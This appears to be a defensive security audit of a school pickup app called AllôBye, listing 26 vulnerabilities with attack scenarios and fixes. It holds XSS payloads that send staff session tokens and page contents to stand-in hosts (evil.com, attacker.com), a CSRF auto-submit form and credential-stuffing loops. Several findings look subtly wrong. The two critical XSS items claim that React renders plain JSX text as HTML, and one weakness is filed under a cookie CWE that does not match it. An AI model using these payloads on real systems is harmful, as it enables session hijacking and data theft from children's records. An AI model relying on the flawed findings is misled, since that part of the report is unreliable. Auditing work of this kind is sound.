# Vulnerabilities Report - AllôBye

**Date**: 2025-11-04
**System**: AllôBye School Pickup Coordination System
**Total Vulnerabilities**: 26

---

## Severity Distribution

| Severity | Count | Percentage |
|----------|-------|------------|
| CRITICAL | 5     | 19.2%      |
| HIGH     | 7     | 26.9%      |
| MEDIUM   | 8     | 30.8%      |
| LOW      | 6     | 23.1%      |

---

## CRITICAL Vulnerabilities (5)

### VULN-001: Unencrypted Medical Information
**Severity**: CRITICAL
**CVSS Score**: 9.1 (Critical)
**Category**: A02:2021 - Cryptographic Failures
**CWE**: CWE-311 - Missing Encryption of Sensitive Data

**Location**: `/home/user/openai-apps-sdk-examples/allobye_server_python/schema.sql:49`

**Description**:
The `medical_info` field in the `children` table stores sensitive medical data (allergies, medications, health conditions) in plaintext without encryption.

**Code**:
```sql
CREATE TABLE children (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name TEXT NOT NULL,
    medical_info TEXT,  -- ⚠️ PLAINTEXT
    ...
);
```

**Attack Scenario**:
1. Attacker gains read access to database (SQL injection, backup theft, insider threat)
2. Attacker exfiltrates all medical data for children
3. Data used for blackmail, discrimination, or sold on dark web

**Impact**:
- **Confidentiality**: Complete breach of medical privacy
- **Legal**: Violation of Quebec Loi 25, potential fines
- **Reputation**: Loss of parent trust, school liability
- **Child Safety**: Medical conditions exposed to unauthorized parties

**Affected Data**:
- Allergies (life-threatening conditions)
- Medications
- Chronic illnesses
- Disabilities

**Remediation**:
1. Implement field-level encryption using PostgreSQL `pgcrypto` extension
2. Encrypt data at application layer before storing
3. Use AWS KMS or similar for key management
4. Implement key rotation policy

**Proof of Concept**:
```sql
-- Current (VULNERABLE):
SELECT medical_info FROM children WHERE id = 'child-uuid';
-- Returns: "Severe peanut allergy, EpiPen required"

-- After Fix:
SELECT pgp_sym_decrypt(medical_info_encrypted, 'encryption-key') FROM children WHERE id = 'child-uuid';
```

**References**:
- OWASP: [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
- Loi 25: Articles 8, 12 (Security safeguards)

---

### VULN-002: Cross-Site Scripting (XSS) in Pickup Notes
**Severity**: CRITICAL
**CVSS Score**: 8.8 (High)
**Category**: A03:2021 - Injection
**CWE**: CWE-79 - Cross-Site Scripting

**Location**: `/home/user/openai-apps-sdk-examples/src/allobye-dashboard/pickup-card.jsx:58-63`

**Description**:
User-controlled `pickup.notes` field is rendered directly in React without sanitization, allowing JavaScript injection.

**Code**:
```javascript
{pickup.notes && (
  <div className="pickup-notes">
    <span className="notes-icon">📝</span>
    {pickup.notes}  // ⚠️ NO SANITIZATION
  </div>
)}
```

**Attack Scenario**:
1. Attacker with parent account schedules pickup with malicious note:
   ```javascript
   notes: "<img src=x onerror=fetch('https://evil.com?token='+localStorage.getItem('allobye_token'))>"
   ```
2. School staff views dashboard
3. XSS executes, stealing school staff session token from localStorage
4. Attacker uses stolen token to mark pickups as complete, access all school data

**Impact**:
- **Session Hijacking**: Attacker gains full access to school dashboard
- **Data Theft**: Exfiltrate all pickup information, child data
- **Unauthorized Actions**: Mark children as picked up by wrong person
- **Child Safety**: Wrong pickup person could be authorized

**Proof of Concept**:
```javascript
// Malicious pickup note:
const maliciousNote = `<img src=x onerror="
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('allobye_token'),
      user: localStorage.getItem('allobye_user'),
      dashboard: document.body.innerHTML
    })
  })
">`;

// When rendered, executes JavaScript
```

**Remediation**:
1. Use DOMPurify to sanitize all user content:
   ```javascript
   import DOMPurify from 'dompurify';

   <div className="pickup-notes">
     {DOMPurify.sanitize(pickup.notes)}
   </div>
   ```
2. Implement Content Security Policy headers
3. Move tokens from localStorage to httpOnly cookies

**References**:
- OWASP: [XSS](https://owasp.org/www-community/attacks/xss/)
- React Security: [Dangerous Props](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)

---

### VULN-003: XSS in Emergency Alert Context
**Severity**: CRITICAL
**CVSS Score**: 8.8 (High)
**Category**: A03:2021 - Injection
**CWE**: CWE-79 - Cross-Site Scripting

**Location**: `/home/user/openai-apps-sdk-examples/src/allobye-dashboard/emergency-alert.jsx:35`

**Description**:
Emergency `context` field rendered without sanitization in alert banner.

**Code**:
```javascript
<div className="alert-context">{alert.context}</div>  // ⚠️ UNSAFE
```

**Attack Scenario**:
1. Attacker declares emergency with malicious context:
   ```javascript
   context: "<script>document.location='https://evil.com?c='+localStorage.getItem('allobye_token')</script>"
   ```
2. Emergency broadcast triggers on all school dashboards
3. All logged-in school staff have sessions stolen
4. Attacker controls multiple schools

**Impact**:
- **Mass Session Hijacking**: All school staff in emergency scope affected
- **Broadcast Amplification**: One malicious emergency affects multiple users
- **Critical System**: Emergencies are high-priority, always displayed
- **Parent Trust**: Fake emergencies cause panic

**Remediation**:
Same as VULN-002, plus:
- Validate emergency context on backend
- Limit emergency context to 500 characters
- Add profanity/malicious content filter

---

### VULN-004: Service Role Key in Production Code
**Severity**: CRITICAL
**CVSS Score**: 9.8 (Critical)
**Category**: A05:2021 - Security Misconfiguration
**CWE**: CWE-798 - Use of Hard-coded Credentials

**Location**: `/home/user/openai-apps-sdk-examples/allobye_server_python/main.py:73-86`

**Description**:
Main application uses `SUPABASE_SERVICE_ROLE_KEY` which **bypasses all Row-Level Security (RLS) policies**. If this key is compromised, attacker has unrestricted database access.

**Code**:
```python
def get_supabase():
    global _supabase_client
    if _supabase_client is None:
        url = os.getenv("SUPABASE_URL")
        key = os.getenv("SUPABASE_SERVICE_ROLE_KEY")  # ⚠️ BYPASSES RLS
        _supabase_client = create_client(url, key)
    return _supabase_client
```

**Attack Scenario**:
1. Attacker gains access to `.env` file (git commit, server breach, social engineering)
2. Attacker uses SERVICE_ROLE_KEY to connect directly to Supabase
3. All RLS policies are bypassed
4. Attacker reads/modifies ALL data across ALL schools

**Impact**:
- **Complete Database Compromise**: No access controls enforced
- **Mass Data Breach**: All children, parents, schools exposed
- **Data Manipulation**: Attacker can authorize fake delegates, modify pickups
- **Regulatory Violation**: Loi 25 breach notification required

**Affected Operations**:
- All database queries in `main.py` (lines 399-689)
- All authentication operations in `auth.py`

**Remediation**:
1. Use `SUPABASE_ANON_KEY` for all application code
2. Rely on RLS policies for access control
3. Use SERVICE_ROLE_KEY **only** for:
   - Administrative tasks (schema migrations)
   - Background jobs (cleanup)
   - Server-side operations with proper audit logging
4. Store SERVICE_ROLE_KEY in secure vault (AWS Secrets Manager)
5. Rotate key immediately if committed to git

**Detection**:
```bash
# Check if SERVICE_ROLE_KEY was committed
git log -p | grep "SERVICE_ROLE_KEY"
```

---

### VULN-005: Frontend Bypasses Backend Authorization
**Severity**: CRITICAL
**CVSS Score**: 8.1 (High)
**Category**: A01:2021 - Broken Access Control
**CWE**: CWE-306 - Missing Authentication for Critical Function

**Location**: `/home/user/openai-apps-sdk-examples/src/allobye-dashboard/dashboard.jsx:56-144`

**Description**:
Frontend React widget directly subscribes to Supabase database changes using ANON_KEY, completely bypassing the MCP tool layer and application-level authorization.

**Code**:
```javascript
// Frontend DIRECTLY accesses database
const supabase = createClient(supabaseUrl, supabaseKey);

supabase
  .channel("pickups-changes")
  .on("postgres_changes", {
    table: "pickups",  // ⚠️ BYPASSES MCP LAYER
    filter: `school_id=eq.${schoolInfo.id}`
  })
  .subscribe();
```

**Architecture Violation**:
```
INTENDED:
Frontend → MCP Tools → Business Logic → RLS → Database

ACTUAL:
Frontend → RLS → Database
          ↘ MCP Tools (BYPASSED)
```

**Attack Scenario**:
1. Attacker finds bug in RLS policy (complex logic, missed edge case)
2. Attacker subscribes to `pickups` table with crafted filter
3. Attacker receives real-time updates for unauthorized data
4. MCP layer security checks never execute

**Impact**:
- **Single Point of Failure**: RLS becomes only defense
- **Business Logic Bypass**: Validation, audit logging, rate limiting all skipped
- **Defense in Depth Violated**: Loses layered security
- **Difficult to Patch**: If RLS bug found, requires database migration (downtime)

**Proof of Concept**:
```javascript
// Attacker's code (runs in browser console):
const supabase = createClient(SUPABASE_URL, ANON_KEY);

// Try to bypass filter
supabase
  .channel('all-pickups')
  .on('postgres_changes', {
    table: 'pickups',
    filter: 'school_id=neq.null'  // Get ALL schools
  })
  .subscribe((payload) => {
    console.log('Leaked pickup:', payload);
  });
```

**Remediation**:
1. **Remove all direct Supabase subscriptions from frontend**
2. Create MCP tool for real-time updates:
   ```python
   @mcp.tool("subscribe-pickup-updates")
   async def subscribe_pickups(school_id: str, access_token: str):
       # Verify authorization
       user = await validate_session(access_token)
       if not await verify_staff_at_school(user.id, school_id):
           raise Unauthorized()

       # Return SSE stream or WebSocket
       return stream_pickups(school_id)
   ```
3. Use Server-Sent Events (SSE) or WebSocket through MCP
4. All data flows through authorization layer

---

## HIGH Vulnerabilities (7)

### VULN-006: Weak Password Requirements
**Severity**: HIGH
**CVSS Score**: 7.5 (High)
**Category**: A07:2021 - Identification and Authentication Failures
**CWE**: CWE-521 - Weak Password Requirements

**Location**:
- `allobye_server_python/auth.py:222`
- `src/allobye-dashboard/auth-screen.jsx:79, 281`

**Description**:
System accepts passwords as short as 6 characters with no complexity requirements.

**Code**:
```python
password: str = Field(..., min_length=6)  # Too weak
```

**Attack Scenario**:
1. Attacker identifies parent email (public school directory, social media)
2. Attacker uses brute force with common 6-character passwords
3. Attacker gains access to parent account
4. Attacker schedules fake pickups, views child data

**Impact**:
- Account takeover via brute force
- Unauthorized access to child information
- Ability to schedule/cancel pickups

**Brute Force Stats**:
- 6-char lowercase: ~308 million combinations
- 6-char alphanumeric: ~2.2 billion combinations
- Modern GPU: Can try 100 billion passwords/second
- **Time to crack**: Under 1 minute

**Remediation**:
1. Increase minimum to 12 characters
2. Require mix of uppercase, lowercase, numbers, symbols
3. Check against common password lists (Have I Been Pwned API)
4. Implement rate limiting on login attempts

**References**:
- NIST SP 800-63B: [Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

### VULN-007: No Rate Limiting
**Severity**: HIGH
**CVSS Score**: 7.5 (High)
**Category**: A07:2021 - Identification and Authentication Failures
**CWE**: CWE-307 - Improper Restriction of Excessive Authentication Attempts

**Location**: All MCP tool endpoints (no middleware implemented)

**Description**:
No rate limiting on any endpoint, allowing unlimited login attempts, emergency broadcasts, and API calls.

**Attack Scenarios**:

**Credential Stuffing**:
```python
# Attacker script
for email, password in leaked_credentials:
    result = mcp.call_tool("auth-login", {
        "email": email,
        "password": password
    })
    if result.success:
        print(f"Compromised: {email}")
```

**Emergency Spam**:
```python
# Flood school dashboards
for i in range(1000):
    mcp.call_tool("emergency-declare", {
        "childId": target_child,
        "emergencyType": "other",
        "context": "SPAM MESSAGE"
    })
```

**Impact**:
- Brute force attacks succeed
- Denial of service
- Emergency system abuse
- Resource exhaustion

**Remediation**:
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@limiter.limit("5 per minute")
async def _handle_auth_login(arguments):
    # Login logic
    pass
```

**Recommended Limits**:
- Login: 5 attempts / 15 minutes / IP
- Emergency: 3 / hour / user
- Pickup scheduling: 20 / hour / user

---

### VULN-008: CORS Allows All Origins
**Severity**: HIGH
**CVSS Score**: 6.5 (Medium)
**Category**: A05:2021 - Security Misconfiguration
**CWE**: CWE-942 - Permissive Cross-domain Policy

**Location**: `/home/user/openai-apps-sdk-examples/allobye_server_python/main.py:1561-1567`

**Description**:
CORS middleware allows requests from **any** origin.

**Code**:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # ⚠️ ACCEPTS ALL ORIGINS
    allow_methods=["*"],
    allow_headers=["*"],
    allow_credentials=False,
)
```

**Attack Scenario**:
1. Attacker creates malicious website `evil-school-app.com`
2. Attacker tricks school staff to visit site
3. Malicious JavaScript makes API calls to AllôBye server
4. Server accepts requests due to permissive CORS
5. Attacker reads responses, calls sensitive endpoints

**Impact**:
- Cross-site request forgery (CSRF)
- Data exfiltration from legitimate sessions
- Unauthorized API access

**Remediation**:
```python
ALLOWED_ORIGINS = [
    "https://allobye.ca",
    "https://dashboard.allobye.ca",
    "https://chat.openai.com",  # For ChatGPT widget
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_methods=["GET", "POST"],
    allow_headers=["Content-Type", "Authorization"],
    allow_credentials=True,
)
```

---

### VULN-009: Plaintext Secrets in .env Files
**Severity**: HIGH
**CVSS Score**: 8.7 (High)
**Category**: A02:2021 - Cryptographic Failures
**CWE**: CWE-522 - Insufficiently Protected Credentials

**Location**: `allobye_server_python/.env`

**Description**:
Sensitive credentials stored in plaintext `.env` files.

**Contents**:
```env
SUPABASE_SERVICE_ROLE_KEY=your_service_role_key_here
DATABASE_URL=postgresql://postgres:password@db.supabase.co:5432/postgres
```

**Attack Scenario**:
1. Developer accidentally commits `.env` to git
2. Public repository → immediate compromise
3. Private repository → compromised if git server breached
4. Server breach → attacker reads file system

**Historical Precedents**:
- Uber 2016: AWS keys in git → $148M breach
- Codecov 2021: Bash script exposure → supply chain attack

**Impact**:
- Complete database access
- Ability to impersonate service role
- Credential leakage to git history (permanent)

**Remediation**:
1. Use AWS Secrets Manager:
   ```python
   import boto3

   def get_secret(secret_name):
       client = boto3.client('secretsmanager')
       response = client.get_secret_value(SecretId=secret_name)
       return response['SecretString']

   SUPABASE_KEY = get_secret('allobye/supabase/service-role-key')
   ```
2. Add `.env` to `.gitignore`
3. Scan git history for leaked secrets: `git-secrets` or `truffleHog`
4. Rotate all keys immediately

---

### VULN-010: No Content Security Policy (CSP)
**Severity**: HIGH
**CVSS Score**: 6.1 (Medium)
**Category**: A05:2021 - Security Misconfiguration
**CWE**: CWE-1021 - Improper Restriction of Rendered UI Layers

**Location**: No CSP headers in response

**Description**:
Missing Content-Security-Policy headers make XSS exploitation easier.

**Current Headers**: (None)

**Attack Amplification**:
Without CSP, successful XSS can:
- Load external malicious scripts
- Send data to any domain
- Execute inline JavaScript
- Load tracking pixels

**Remediation**:
```python
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://chat.openai.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https://*.supabase.co; "
        "frame-ancestors 'none';"
    )
    return response

app.middleware("http")(add_security_headers)
```

**References**:
- MDN: [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

### VULN-011: No HSTS Headers
**Severity**: HIGH
**CVSS Score**: 5.9 (Medium)
**Category**: A05:2021 - Security Misconfiguration
**CWE**: CWE-523 - Unprotected Transport of Credentials

**Location**: No HSTS headers in response

**Description**:
Missing HTTP Strict Transport Security (HSTS) headers allow downgrade attacks.

**Attack Scenario**:
1. User on public WiFi types `allobye.ca` (no HTTPS prefix)
2. Browser tries HTTP first
3. Attacker intercepts with MitM, serves fake HTTP page
4. User enters credentials on fake page
5. Credentials stolen before HTTPS redirect

**Remediation**:
```python
response.headers['Strict-Transport-Security'] = (
    "max-age=31536000; includeSubDomains; preload"
)
```

**Additional Steps**:
1. Submit domain to [HSTS Preload List](https://hstspreload.org/)
2. Redirect all HTTP to HTTPS at load balancer
3. Enable HSTS in Cloudflare/CDN settings

---

### VULN-012: No Field-Level Encryption for PII
**Severity**: HIGH
**CVSS Score**: 7.5 (High)
**Category**: A02:2021 - Cryptographic Failures
**CWE**: CWE-311 - Missing Encryption of Sensitive Data

**Location**: `schema.sql` - Multiple tables

**Description**:
Personal Identifiable Information (PII) stored in plaintext:

**Affected Fields**:
- `children.parent_phone` - Phone numbers
- `children.parent_email` - Email addresses
- `children.parent_name` - Parent names
- `delegates.phone` - Delegate phone numbers
- `delegates.email` - Delegate emails

**Impact**:
- Data breach exposes all contact information
- Spam/phishing campaigns targeting parents
- Identity theft
- Violation of Quebec Loi 25

**Remediation**:
```sql
-- Add encrypted columns
ALTER TABLE children
  ADD COLUMN parent_phone_encrypted BYTEA;

-- Encrypt existing data
UPDATE children
SET parent_phone_encrypted = pgp_sym_encrypt(parent_phone, 'encryption-key');

-- Drop plaintext column
ALTER TABLE children DROP COLUMN parent_phone;
```

---

## MEDIUM Vulnerabilities (8)

### VULN-013: Session Tokens in localStorage
**Severity**: MEDIUM
**CVSS Score**: 6.5 (Medium)
**Category**: A07:2021 - Identification and Authentication Failures
**CWE**: CWE-539 - Information Exposure Through Persistent Cookies

**Location**: `auth-screen.jsx:45, 100, 108`

**Description**:
Access tokens stored in localStorage are accessible to any JavaScript, including XSS attacks.

**Code**:
```javascript
localStorage.setItem("allobye_token", result.structuredContent.access_token);
```

**Attack Scenario**:
1. XSS vulnerability exploited (see VULN-002)
2. Malicious script reads localStorage
3. Session token exfiltrated
4. Attacker uses token to impersonate user

**Remediation**:
Store tokens in httpOnly, secure cookies:
```python
# Backend sets cookie
response.set_cookie(
    key="allobye_session",
    value=access_token,
    httponly=True,  # Not accessible to JavaScript
    secure=True,    # HTTPS only
    samesite="strict"
)
```

---

### VULN-014: Email Enumeration
**Severity**: MEDIUM
**CVSS Score**: 5.3 (Medium)
**Category**: A01:2021 - Broken Access Control
**CWE**: CWE-204 - Observable Response Discrepancy

**Location**: `auth.py:207-210`

**Description**:
Error messages reveal whether email exists in system.

**Code**:
```python
if "already registered" in error_msg:
    raise UserAlreadyExistsError(f"User with email {email} already exists")
```

**Attack Scenario**:
1. Attacker enumerates emails of parents from school website
2. Attacker tests each email in signup form
3. Different error messages reveal which are registered
4. Attacker targets registered accounts for phishing

**Remediation**:
Return generic message:
```python
# Always return same message
return {
    "message": "If this email is registered, a reset link has been sent."
}
```

---

### VULN-015: Complex RLS Policies Hard to Audit
**Severity**: MEDIUM
**CVSS Score**: 5.5 (Medium)
**Category**: A04:2021 - Insecure Design
**CWE**: CWE-1188 - Insecure Default Initialization

**Location**: `schema.sql:267-486` (21 policies)

**Description**:
RLS policies contain nested EXISTS clauses that are difficult to verify for correctness.

**Example**:
```sql
CREATE POLICY "School staff can view children at their school"
    ON children FOR SELECT
    USING (
        EXISTS (
            SELECT 1 FROM schools
            WHERE schools.id = children.school_id
            AND schools.email = auth.jwt()->>'email'  -- Fragile
        )
    );
```

**Concerns**:
- Relies on `schools.email` matching JWT email (what if school has multiple staff?)
- Complex nested queries may have edge cases
- Hard to write unit tests for RLS policies

**Remediation**:
1. Create dedicated `staff_schools` table
2. Simplify policies to single-table lookups
3. Document all policies with examples
4. Create RLS test suite

---

### VULN-016: No CSRF Protection
**Severity**: MEDIUM
**CVSS Score**: 6.5 (Medium)
**Category**: A01:2021 - Broken Access Control
**CWE**: CWE-352 - Cross-Site Request Forgery

**Description**:
No CSRF tokens on state-changing operations.

**Attack Scenario**:
1. Attacker creates malicious page with hidden form:
   ```html
   <form id="evil" action="https://allobye.ca/mcp/pickup-schedule-create" method="POST">
     <input name="childIds" value="['victim-child-id']">
     <input name="pickupPersonId" value="attacker-delegate-id">
   </form>
   <script>document.getElementById('evil').submit()</script>
   ```
2. School staff visits attacker's page while logged in
3. Form auto-submits, schedules unauthorized pickup
4. Child potentially picked up by wrong person

**Mitigation**:
JWT in header provides some protection, but add CSRF tokens for defense in depth:
```python
from starlette_csrf import CSRFMiddleware

app.add_middleware(CSRFMiddleware, secret="csrf-secret-key")
```

---

### VULN-017: Verbose Error Messages
**Severity**: MEDIUM
**CVSS Score**: 5.3 (Medium)
**Category**: A05:2021 - Security Misconfiguration
**CWE**: CWE-209 - Information Exposure Through Error Message

**Location**: Multiple exception handlers

**Description**:
Error messages may expose internal details.

**Examples**:
```python
raise AuthenticationError(f"Signup failed: {e}")  # Exposes DB errors
raise AuthenticationError(f"Login failed: {e}")   # Reveals internal state
```

**Information Leaked**:
- Database connection errors
- Table/column names
- SQL query structure
- Python stack traces

**Remediation**:
```python
# Log detailed error
logger.error("Signup failed", error=str(e), email=email)

# Return generic message to user
raise AuthenticationError("Unable to create account. Please try again.")
```

---

### VULN-018: No Audit Logging for Sensitive Operations
**Severity**: MEDIUM
**CVSS Score**: 5.9 (Medium)
**Category**: A08:2021 - Software and Data Integrity Failures
**CWE**: CWE-778 - Insufficient Logging

**Description**:
No audit trail for critical operations:
- Delegate authorization changes
- Emergency declarations
- Pickup status modifications

**Impact**:
- Cannot detect unauthorized changes
- No forensic trail for incidents
- Compliance violation (Loi 25 Article 23)

**Remediation**:
```sql
CREATE TABLE audit_log (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    user_id UUID NOT NULL,
    action TEXT NOT NULL,
    entity_type TEXT NOT NULL,
    entity_id UUID NOT NULL,
    old_value JSONB,
    new_value JSONB,
    ip_address INET
);

-- Trigger on delegate_children changes
CREATE TRIGGER audit_delegate_changes
    AFTER INSERT OR UPDATE OR DELETE ON delegate_children
    FOR EACH ROW
    EXECUTE FUNCTION log_audit_trail();
```

---

### VULN-019: Mock Mode Bypasses Security
**Severity**: MEDIUM
**CVSS Score**: 7.4 (High)
**Category**: A05:2021 - Security Misconfiguration
**CWE**: CWE-489 - Active Debug Code

**Location**: Throughout `auth.py` and `main.py`

**Description**:
Mock mode returns `True` for all authorization checks.

**Code**:
```python
if not supabase:
    return True  # Mock: allow all
```

**Risk**:
If mock mode accidentally enabled in production:
- All authorization bypassed
- Any user can access any data
- Complete security failure

**Remediation**:
1. Remove mock mode entirely
2. Or add safeguard:
   ```python
   if not supabase:
       if os.getenv("ENVIRONMENT") == "production":
           raise RuntimeError("Mock mode not allowed in production")
       return True
   ```

---

### VULN-020: No Data Retention Policy
**Severity**: MEDIUM
**CVSS Score**: 4.3 (Medium)
**Category**: Privacy / Compliance
**CWE**: CWE-1275 - Sensitive Cookie with Improper SameSite Attribute

**Description**:
No automatic deletion of old data:
- Completed pickups retained indefinitely
- Resolved emergencies never deleted
- Old delegate authorizations kept forever

**Impact**:
- Privacy violation (Loi 25 Article 12)
- Increased attack surface (more data to breach)
- Storage costs

**Remediation**:
```sql
-- Scheduled job to delete old data
CREATE FUNCTION cleanup_old_data() RETURNS void AS $$
BEGIN
    -- Delete pickups older than 90 days
    DELETE FROM pickups
    WHERE scheduled_time < NOW() - INTERVAL '90 days'
    AND status IN ('completed', 'cancelled');

    -- Delete resolved emergencies older than 30 days
    DELETE FROM emergencies
    WHERE resolved = TRUE
    AND resolved_at < NOW() - INTERVAL '30 days';
END;
$$ LANGUAGE plpgsql;

-- Schedule via pg_cron or external cron job
SELECT cron.schedule('cleanup-old-data', '0 2 * * *', 'SELECT cleanup_old_data()');
```

---

## LOW Vulnerabilities (6)

### VULN-021: No Session Timeout Warning
**Severity**: LOW
**CVSS Score**: 3.5 (Low)
**Category**: Usability / Security
**CWE**: CWE-613 - Insufficient Session Expiration

**Description**:
Users not warned before session expires.

**Impact**:
- Users lose work
- Confusion about logout
- Poor user experience

**Remediation**:
```javascript
// Check token expiry
const checkTokenExpiry = () => {
  const expiryTime = jwt_decode(token).exp * 1000;
  const timeUntilExpiry = expiryTime - Date.now();

  if (timeUntilExpiry < 5 * 60 * 1000) {  // 5 minutes
    showWarning("Your session will expire soon. Save your work.");
  }
};
```

---

### VULN-022: ISO 8601 Date Validation Missing
**Severity**: LOW
**CVSS Score**: 3.1 (Low)
**Category**: Input Validation
**CWE**: CWE-20 - Improper Input Validation

**Location**: `PickupScheduleInput.scheduled_time`

**Description**:
`scheduled_time` field accepts any string, no validation it's valid ISO 8601.

**Remediation**:
```python
from datetime import datetime

@field_validator('scheduled_time')
def validate_iso8601(cls, v):
    try:
        datetime.fromisoformat(v.replace('Z', '+00:00'))
    except ValueError:
        raise ValueError("scheduled_time must be valid ISO 8601 format")
    return v
```

---

### VULN-023: Email Format Not Validated
**Severity**: LOW
**CVSS Score**: 3.1 (Low)
**Category**: Input Validation
**CWE**: CWE-20 - Improper Input Validation

**Description**:
Email fields accept any string, no regex validation.

**Remediation**:
```python
from pydantic import EmailStr

email: EmailStr = Field(...)  # Built-in email validation
```

---

### VULN-024: Logging May Contain Sensitive Data
**Severity**: LOW
**CVSS Score**: 4.3 (Low)
**Category**: A09:2021 - Security Logging and Monitoring Failures
**CWE**: CWE-532 - Insertion of Sensitive Information into Log File

**Description**:
Structured logging may log sensitive data in error scenarios.

**Remediation**:
```python
# Redact sensitive fields
def sanitize_for_logging(data):
    redacted_fields = ['password', 'medical_info', 'phone']
    return {k: '***REDACTED***' if k in redacted_fields else v
            for k, v in data.items()}

logger.error("Operation failed", data=sanitize_for_logging(user_data))
```

---

### VULN-025: No Integrity Checks on Emergency Broadcasts
**Severity**: LOW
**CVSS Score**: 4.1 (Low)
**Category**: A08:2021 - Software and Data Integrity Failures
**CWE**: CWE-353 - Missing Support for Integrity Check

**Description**:
Emergency notifications not signed, could be tampered with if intercepted.

**Remediation**:
```python
import hmac
import hashlib

def sign_emergency(emergency_data, secret_key):
    message = json.dumps(emergency_data, sort_keys=True)
    signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()
    return {"data": emergency_data, "signature": signature}
```

---

### VULN-026: No Stack Trace Sanitization
**Severity**: LOW
**CVSS Score**: 3.7 (Low)
**Category**: Information Disclosure
**CWE**: CWE-209 - Information Exposure Through Error Message

**Description**:
Python stack traces may be exposed in error responses.

**Remediation**:
```python
# Global exception handler
@app.exception_handler(Exception)
async def generic_exception_handler(request, exc):
    logger.error("Unhandled exception", exc_info=exc)

    if os.getenv("ENVIRONMENT") == "production":
        return JSONResponse(
            status_code=500,
            content={"error": "Internal server error"}
        )
    else:
        return JSONResponse(
            status_code=500,
            content={"error": str(exc), "traceback": traceback.format_exc()}
        )
```

---

## Remediation Priority Matrix

| Priority | Count | Timeline | Focus Areas |
|----------|-------|----------|-------------|
| **P0 (Immediate)** | 5 CRITICAL | 1-2 days | Data encryption, XSS fixes, auth architecture |
| **P1 (Urgent)** | 7 HIGH | 1-2 weeks | Rate limiting, security headers, secret management |
| **P2 (Important)** | 8 MEDIUM | 2-4 weeks | CSRF, audit logging, error handling |
| **P3 (Nice to have)** | 6 LOW | 4+ weeks | UX improvements, validation refinements |

---

## Testing Recommendations

### Security Testing Tools:

1. **SAST** (Static Analysis):
   - Bandit (Python): `bandit -r allobye_server_python/`
   - ESLint security plugin (JavaScript)

2. **DAST** (Dynamic Analysis):
   - OWASP ZAP
   - Burp Suite Professional

3. **Secret Scanning**:
   - git-secrets
   - truffleHog
   - GitHub Advanced Security

4. **Dependency Scanning**:
   - Snyk
   - Dependabot
   - Safety (Python)

5. **XSS Testing**:
   - XSStrike
   - Manual testing with payloads

---

## Conclusion

AllôBye has **26 identified vulnerabilities** with a concerning number (5) at CRITICAL severity. The system demonstrates good architectural patterns but requires immediate security hardening before production deployment with real child data.

**Key Themes**:
1. **Data Protection**: Lack of encryption for sensitive data
2. **XSS Risks**: Multiple injection points in React widgets
3. **Authorization Bypass**: Frontend can circumvent MCP layer
4. **Configuration**: Missing security headers and hardening

**Overall Recommendation**: **DO NOT DEPLOY TO PRODUCTION** until all CRITICAL and HIGH vulnerabilities are resolved.

---

**Next Steps**: See `security_recommendations.md` for detailed fix guidance.
